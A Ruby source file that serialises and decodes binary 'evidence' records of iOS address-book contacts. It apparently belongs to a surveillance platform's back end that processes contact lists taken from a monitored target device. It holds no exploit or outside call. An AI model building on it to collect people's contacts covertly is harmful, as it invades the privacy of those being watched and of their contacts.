require 'rcs-common/evidence/common'
require 'rcs-common/serializer'

module RCS
  module IaddressbookEvidence

    VERSION_2 = 0x10000000
    CONTACTLIST = 0x0000C021
    CONTACTFILE = 0x0000C022

    LOCAL_CONTACT = 0x80000000

    def content
      header = StringIO.new
      header.write [CONTACTLIST | VERSION_2].pack('L')
      header.write [LOCAL_CONTACT].pack('L')   # flags
      header.write [0].pack('L')   # len (ignored)
      header.write [1].pack('L')   # num records

      header.write [CONTACTFILE].pack('L')
      header.write [0].pack('L')   # len (ignored)

      name = "FirstName".to_utf16le_binary_null
      write_name(header, name)

      name = "LastName".to_utf16le_binary_null
      write_name(header, name)

      header.write [CONTACTFILE].pack('L')
      header.write [1].pack('L')   # num_contacts

      name = "+39123456789".to_utf16le_binary_null
      write_number(header, name)

      header.string
    end

    def generate_content
      [content]
    end

    def decode_content(common_info, chunks)
      stream = StringIO.new chunks.join

      # ABLogStruct
      magic = read_uint32 stream

      puts magic

      raise EvidenceDeserializeError.new("invalid log version for IADDRESSBOOK [#{magic} != #{CONTACTLIST}]") unless magic == CONTACTLIST or magic == (CONTACTLIST | VERSION_2)

      flags = read_uint32(stream) if (magic & VERSION_2 != 0)

      stream.read(4) # len, ignore
      num_records = read_uint32 stream

      for i in (0..num_records-1)

        info = Hash[common_info]
        info[:data] ||= Hash.new
        info[:data][:type] = :target if (flags & LOCAL_CONTACT != 0)

        # ABFile
        magic = read_uint32 stream
        raise EvidenceDeserializeError.new("invalid log version for IADDRESSBOOK [#{magic} != #{CONTACTFILE}]") unless magic == CONTACTFILE
        len = read_uint32 stream

        #ABName (first name)
        first_name = read_name(stream)

        #ABName (last name)
        last_name = read_name(stream)

        info[:data][:name] = "#{first_name} #{last_name}"

        #ABContacts
        magic = read_uint32 stream
        num_contacts = read_uint32 stream

        for i in (0..num_contacts-1)
          type, number = read_number(stream)
          case type
            when 0
              info[:data][:contact] ||= number
            else
              info[:data][:info] += "#{number}\n"
          end
        end

        trace :debug, "IADDRESSBOOK #{info[:data]}"

        yield info if block_given?
      end

      :keep_raw
    end

    def read_name(stream)
      magic = read_uint32 stream
      len = read_uint32 stream
      stream.read(len).utf16le_to_utf8
    end

    def write_name(stream, name)
      stream.write [CONTACTFILE].pack('L')
      stream.write [name.bytesize].pack('L')
      stream.write name
    end

    def read_number(stream)
      magic = read_uint32 stream
      type = read_uint32 stream
      name = read_name(stream)
      return type, name
    end

    def write_number(stream, number)
      stream.write [CONTACTFILE].pack('L')
      stream.write [0].pack('L') # type
      write_name(stream, number)
    end


  end # ::AddressbookEvidence
end # ::RCS
